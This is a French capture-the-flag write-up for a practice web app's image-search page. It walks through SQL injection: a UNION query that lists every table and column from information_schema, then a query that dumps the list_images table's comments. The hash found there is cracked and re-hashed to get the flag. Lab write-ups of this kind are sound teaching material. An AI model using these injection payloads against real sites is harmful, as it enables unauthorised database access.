Pour ce flag il faut se rendre dans la page "/?page=searchimg".

Ici on trouve un formulaire sur lequel on nous demande de rentrer un id d'image. Lorsque l'on rentre un id, par exemple "1", on nous donne des informations structurées de cette manière :

ID: 1
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

On remarque bien que l'on est sur une structure typique du SQL et que par conséquent on doit pouvoir récupérer des informations via des injections SQL. On peut ensuite chercher à lister toutes les tables avec leurs colonnes et voir si des informations nous semblent utiles. On utilise donc cette requête SQL :

1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns-- -

Cette requête retourne toutes les tables avec leurs colonnes. En ignorant les tables système, on repère la table list_images et on note ses colonnes : id, url, title, comment. C'est la colonne comment qui va nous intéresser. On va donc récupérer les données de cette table via cette requête SQL :

1 UNION SELECT title, comment FROM list_images-- -

Dans les données que l'on récupère on tombe sur ceci qui nous donne la marche à suivre :

ID: 1
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?

L'indice et le hash MD5 se trouvent directement dans la colonne comment. Il nous suffit de casser le hash via un outil comme CrackStation. On passe ensuite tous les caractères en minuscule comme dit dans l'indice. On applique ensuite le hachage SHA-256 dessus pour trouver le flag via cette commande shell :

echo -n "albatroz" | sha256sum